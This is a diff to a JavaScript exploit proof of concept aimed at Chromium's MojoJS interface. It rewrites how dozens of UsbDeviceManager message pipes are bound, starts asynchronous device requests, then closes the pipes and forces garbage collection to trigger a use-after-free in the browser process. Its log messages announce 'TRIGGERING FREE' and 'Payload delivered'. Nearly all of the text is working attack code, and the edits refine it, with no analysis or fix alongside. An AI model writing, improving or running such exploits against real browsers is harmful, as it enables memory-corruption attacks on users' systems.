@@ -11,7 +11,7 @@
 
         async function triggerExploit() {
             if (typeof Mojo === 'undefined') {
-                console.error("[-] MojoJS not found.");
+                console.error("[-] MojoJS not found. Ensure --enable-blink-features=MojoJS is set.");
                 return;
             }
 
@@ -19,13 +19,15 @@
             let managers = [];
             
             for(let i = 0; i < 50; i++) {
+                // 1. Create a raw Mojo message pipe. This gives us two endpoints.
+                let pipe = Mojo.createMessagePipe();
+                
+                // 2. Bind the Browser Process end of the pipe (handle0)
+                Mojo.bindInterface(UsbDeviceManager.$interfaceName, pipe.handle0);
+
+                // 3. Bind our JS Remote to the other end of the pipe (handle1)
                 let usbManagerRemote = new UsbDeviceManagerRemote();
-                
-                // 1. Create the receiver pipe
-                let receiver = usbManagerRemote.$.bindNewPipeAndPassReceiver();
-                
-                // 2. Pass the raw handle of the receiver to the Browser Process
-                Mojo.bindInterface(UsbDeviceManager.$interfaceName, receiver.handle);
+                usbManagerRemote.$.bindHandle(pipe.handle1);
                 
                 managers.push(usbManagerRemote);
             }
@@ -34,8 +36,7 @@
             console.log("[*] Triggering async hardware requests...");
             
             for(let m of managers) {
-                // Call GetDevices. We catch the error because we expect 
-                // the pipe to break before it finishes.
+                // Call GetDevices to initiate the async hardware scan
                 m.getDevices().catch(e => {}); 
             }
 
@@ -44,15 +45,15 @@
 
             console.log("[!] TRIGGERING FREE: Severing pipes...");
             
-            // The Kill: Close the pipes.
+            // The Kill: Close the pipes to trigger the C++ destructor
             for(let m of managers) {
                 m.$.close();
             }
 
-            // Force garbage collection
+            // Force garbage collection in V8
             if (window.gc) { window.gc(); }
 
-            console.log("[?] Payload delivered. Waiting for C++ crash...");
+            console.log("[?] Payload delivered. Waiting for C++ callback...");
         }
 
         triggerExploit();
